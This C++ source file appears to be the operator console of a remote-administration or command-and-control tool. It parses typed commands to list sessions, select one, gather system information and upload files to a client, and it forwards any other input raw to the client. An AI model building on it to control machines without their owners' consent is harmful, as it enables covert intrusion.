#include "Factory_Server.h"
std::vector<std::string> split(const char* buffer)
{
	std::string s = std::string(buffer);
	std::vector<std::string> args;
	const std::string delimiter = " ";
	unsigned short pos = 0;
	auto start = 0U;
	auto end = s.find(delimiter);
	while (end != std::string::npos)
	{
		args.push_back(s.substr(start, end - start));
		start = end + delimiter.length();
		end = s.find(delimiter, start);
	}
	args.push_back(s.substr(start, end));
	return args;
}


Factory_Server::Factory_Server(Server* serv1,const char* pbuffer) : buffer(pbuffer)
{
	args = split(pbuffer);

	if (args[0] == "exit" ||args[0] == "EXIT")
	{
		serv1->setExit(1);
	}
	else if (args[0] == "help" || args[0] == "HELP")
	{
		Info::print_help();
	}
	
	else if (args[0] == "list")
	{
		Info::list(serv1);
	}
	else if (args[0] == "set_session" && args.size() == 2)
	{
		Info::set_session(serv1);
	}
	else if (args[0] == "getsysinfo")
	{
		Info::getsysinfo(serv1);
	}
	
	else if (args[0] == "upload" && args.size() == 2)
	{
		Transfer::uploadToClient(serv1, args[1]);
	}
	
	else if (args[0] == "list_scripts")
	{
		Info::list_scripts();
	}
	
	else
	{
		serv1->send_b(buffer.c_str());
	}
}

